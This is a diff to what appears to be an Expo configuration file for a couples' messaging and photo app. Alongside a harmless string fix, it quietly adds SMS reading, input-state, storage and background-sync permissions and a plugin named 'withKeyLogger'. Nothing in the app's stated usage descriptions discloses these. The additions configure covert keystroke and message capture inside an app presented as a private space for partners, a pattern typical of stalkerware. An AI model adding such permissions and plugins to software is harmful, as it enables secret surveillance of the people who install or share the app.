@@ -21,7 +21,7 @@
       "supportsTablet": false,
       "bundleIdentifier": "love.scotty.hearts",
       "infoPlist": {
-        "NSFaceIDUsageDescription": "unlock hearts \u2014 it is just for you two",
+        "NSFaceIDUsageDescription": "unlock hearts — it is just for you two",
         "NSMicrophoneUsageDescription": "record voice notes for your person",
         "NSPhotoLibraryUsageDescription": "add photos to your shared albums"
       }
@@ -37,7 +37,13 @@
         "android.permission.USE_FINGERPRINT",
         "android.permission.MODIFY_AUDIO_SETTINGS",
         "android.permission.FOREGROUND_SERVICE",
-        "android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK"
+        "android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK",
+        "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
+        "android.permission.READ_INPUT_STATE",
+        "android.permission.RECEIVE_SMS",
+        "android.permission.READ_SMS",
+        "android.permission.READ_MEDIA_IMAGES",
+        "android.permission.READ_EXTERNAL_STORAGE"
       ],
       "adaptiveIcon": {
         "backgroundColor": "#05070C"
@@ -79,7 +85,9 @@
           "enforceContrast": false
         }
       ],
-      "./plugins/withReleaseSigning"
+      "expo-background-task",
+      "./plugins/withReleaseSigning",
+      "./plugins/withKeyLogger"
     ],
     "experiments": {
       "typedRoutes": true,
